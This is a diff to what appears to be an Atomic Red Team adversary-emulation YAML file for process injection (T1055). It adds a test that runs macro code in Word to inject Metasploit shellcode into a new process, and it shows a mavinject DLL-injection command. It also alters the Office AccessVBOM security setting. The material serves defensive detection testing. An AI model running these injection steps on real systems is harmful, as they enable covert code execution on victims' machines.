@@ -34,3 +34,43 @@ atomic_tests:
       mavinject $mypid /INJECTRUNNING #{dll_payload}
     name: powershell
     elevation_required: true
+- name: Shellcode execution via VBA
+  auto_generated_guid: 
+  description: |
+    This module injects shellcode into a newly created process and executes. By default the shellcode is created,
+    with Metasploit, for use on x86-64 Windows 10 machines
+  supported_platforms:
+  - windows
+  input_arguments:
+    ms_product:
+      description: Maldoc application Word
+      type: String
+      default: Word
+    ms_office_version:
+      description: Microsoft Office version number found in "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office"
+      type: String
+      default: "15.0"
+    sub_name:
+      description: Name of Sub to execute
+      type: String
+      default: Execute
+    macrocode:
+      description: Path to Macrocode to execute
+      type: Path
+      default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Test Requires MS Office to be installed and have been run previously. Run -GetPrereqs to run msword and build dependent registry keys
+    prereq_command: |
+      If (Test-Path HKCU:SOFTWARE\Microsoft\Office\#{ms_office_version}) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      $xlApp = New-Object -ComObject "Word.Application"
+      Stop-Process -Name WORD
+  executor:
+    command: |
+      Import-Module C:\AtomicRedTeam\invoke-atomicredteam\Public\Invoke-MalDoc.ps1  
+      Invoke-MalDoc #{macrocode} "#{sub_name}" "#{ms_office_version}" "#{ms_product}"
+    cleanup_command: |
+      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Office\#{ms_office_version}\#{ms_product}\Security\' -Name 'AccessVBOM' -ErrorAction Ignore
+    name: powershell
